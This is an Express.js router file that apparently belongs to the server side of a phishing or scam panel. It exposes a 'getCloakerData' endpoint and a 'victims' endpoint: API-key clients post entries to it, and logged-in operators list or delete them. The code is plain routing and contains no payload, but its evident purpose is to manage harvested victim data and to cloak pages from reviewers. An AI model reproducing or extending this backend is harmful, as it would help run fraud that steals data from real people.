const router = require("express").Router();
const UserAuthentication = require("../../middlewares/UserAuthentication");
const ApikeyAuthentication = require("../../middlewares/ApikeyAuthentication");

router.all("/client/me", UserAuthentication, require("./routes/Me"));
router.all(
    "/client/getCloakerData",
    ApikeyAuthentication,
    require("./routes/getCloakerData")
);
router.post(
    "/client/victims",
    ApikeyAuthentication,
    require("./routes/Victims")
);
router.get("/client/victims", UserAuthentication, require("./routes/Victims"));
router.delete(
    "/client/victims",
    UserAuthentication,
    require("./routes/Victims")
);

router.all("*", (req, res) => {
    res.send({
        status: 404,
    });
});

module.exports = router;
